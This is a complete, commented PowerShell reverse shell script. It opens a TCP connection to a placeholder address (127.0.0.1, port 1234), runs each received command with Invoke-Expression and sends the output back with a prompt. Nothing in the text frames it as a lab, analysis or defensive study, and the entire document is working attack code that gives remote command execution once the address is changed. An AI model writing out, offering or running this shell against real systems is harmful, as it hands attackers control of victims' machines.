# Define the IP address and port
$ip = '127.0.0.1'
$port = 1234

# Create a new TCP client
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)

# Get the network stream
$stream = $client.GetStream()

# Create a buffer to store received data
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

# Loop to read data from the stream
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    # Convert bytes to string
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    
    # Execute the received command and capture the output
    $sendback = try {
        Invoke-Expression $data 2>&1 | Out-String
    } catch {
        $_.Exception.Message
    }
    
    # Prepare the output to send back
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
    
    # Convert the output to bytes
    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
    
    # Write the output bytes to the stream
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# Close the client connection
$client.Close()
